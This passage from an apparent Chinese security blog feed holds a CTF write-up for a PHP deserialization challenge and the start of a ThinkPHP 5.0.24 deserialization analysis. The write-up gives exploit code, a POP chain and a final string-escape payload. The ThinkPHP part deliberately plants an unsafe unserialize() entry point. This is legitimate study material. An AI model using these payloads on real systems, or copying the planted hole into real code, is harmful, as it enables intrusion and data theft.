class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>get传参action用来跳转到其它文件，若session[‘login’]==1跳转到update.php</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">   &lt;form action=<span class="string">&quot;login.php&quot;</span> method=<span class="string">&quot;post&quot;</span> style=<span class="string">&quot;margin-top: 300&quot;</span>&gt;</span><br><span class="line">      &lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class="line">      &lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class="line">              &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;UserName&quot;</span> required&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;password&quot;</span> style=<span class="string">&quot;margin-top: 20&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;button style=<span class="string">&quot;margin-top:20;&quot;</span> type=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;img src=<span class="string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$user</span>-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>过滤了一些sql注入的关键字</p><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>新建$users对象，执行update()函数之后，若session[‘login’]===1就显示flag</p><p><strong>lib.php</strong></p><p>User类的__destruct()函数处有注释提醒<code>危</code>，很容易想到是反序列化，本题考点应该就是这个</p><p>safe()函数会替换一些关键字为<code>hacker</code>，这里后面可以用来进行字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>User类中有update()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Info</span>=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span>=<span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到反序列化函数，跟进其中的getNewinfo()，该函数会new一个Info类并对其进行序列化和safe替换，且参数$age，$nickname可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入Info类，有__call()函数可以调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有login()函数的就是User类和dbCtrl类，其中User-&gt;login()也会调用dbCtrl-&gt;login()，跟进dbCtrl-&gt;login()，从中可知用户名为<code>admin</code>，还会返回一个<code>$idresult</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">    <span class="variable">$result</span>-&gt;close();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到Info类，想要调用__call()，首先要调用一个Info类中不可访问的函数</p><p>再回到User类，这里面有一个__string()函数，该函数把类当作字符串使用时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入UpdateHelper类，其__destruct()有<code>echo $this-&gt;sql</code>，若令<code>$sql = new User()</code>，就相当于是在把User类当作字符串处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上pop链为：</p><p><code>UpdateHelper-&gt;__destruct() =&gt; User-&gt;__tostring() =&gt; Info-&gt;__call() =&gt; dbCtrl-&gt;login()</code> </p><p>下面是exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$update</span> = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql = <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname = <span class="variable">$info</span>;</span><br><span class="line"><span class="variable">$info</span>-&gt;CtrlCase = <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$ans</span> = serialize(<span class="variable">$update</span>);</span><br><span class="line"><span class="variable">$ans</span> = <span class="string">&#x27;&quot;;s:8:CtrlCase;&#x27;</span>.<span class="variable">$ans</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ans</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="variable">$ans</span>);</span><br></pre></td></tr></table></figure><p>运行结果为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:<span class="number">8</span>:CtrlCase;O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;newinfo&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">45</span>:<span class="string">&quot;select password,id from user where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">8</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;hostname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;127.0.0.1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbuser&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbpass&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;database&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;mysqli&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"><span class="number">431</span></span><br></pre></td></tr></table></figure><p>共需要逃逸431个字符，故在$ans前面添加88个’与3个union，最终payload为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">age</span>=<span class="number">1</span>&amp;nickname=<span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;unionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>得到md5加密过的密码，解密，再登录即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Zer0pts2020-canyouguessit&quot;&gt;&lt;a href=&quot;#Zer0pts2020-canyouguessit&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]canyouguessit&quot;&gt;&lt;/a&gt;[Zer0pts20</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.24反序列化漏洞分析及复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-01-16T03:40:05.000Z</published>
    <updated>2022-01-17T08:10:31.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛遇到的一个thinkphp框架的考点，在网上找到一些大佬的文章，把漏洞复现一下，整个漏洞利用的流程走一遍</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>phpstudy8.1(wamp)</p><p>thinkphp5.0.24</p><p>php7.3.4</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在<code>/application/index/controller/index.php</code>中添加反序列化利用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        var_dump(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞入口是<code>/thinkphp/library/think/process/pipes/Windows.php</code>中的__destruct()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span 